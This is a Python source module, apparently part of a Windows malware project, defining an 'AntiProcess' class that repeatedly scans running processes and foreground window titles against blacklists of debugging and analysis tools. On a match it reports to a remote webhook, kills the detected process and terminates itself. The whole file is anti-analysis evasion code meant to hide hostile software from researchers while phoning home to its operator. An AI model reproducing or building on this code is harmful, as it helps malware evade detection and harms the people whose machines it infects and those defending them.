import os
import time
import psutil
import win32gui

from ..constants import Lists
from ..utils.webhook import Webhook

class AntiProcess:
    def __init__(self, webhook_url: str) -> None:
        self.webhook_url = webhook_url
        self.webhook = Webhook(webhook_url)
        
    def CheckProcessList(self) -> None:
        while True:
            try:
                time.sleep(0.7)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in Lists.BLACKLISTED_PROGRAMS):
                        try:
                            self.webhook.send(f"Anti-Debug Program: `{proc.name()}` was detected running on the system.", "Anti Process")
                            proc.kill()
                            os._exit(1)
                        except(psutil.NoSuchProcess, psutil.AccessDenied): 
                            pass
            except: 
                pass
            
    def CheckWindowNames(self) -> None:
        while True:
            try:
                time.sleep(0.7)
                window_name = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if window_name in Lists.BLACKLISTED_WINDOW_NAMES:
                    self.webhook.send(f"Found `{window_name}` in Window Names", "Anti Process")
                    os._exit(1)
            except (RuntimeError, NameError, TypeError, OSError) as error:
                self.webhook.send(f"Error!: ```yaml\n{error}\n```")
                pass
        
        
        
        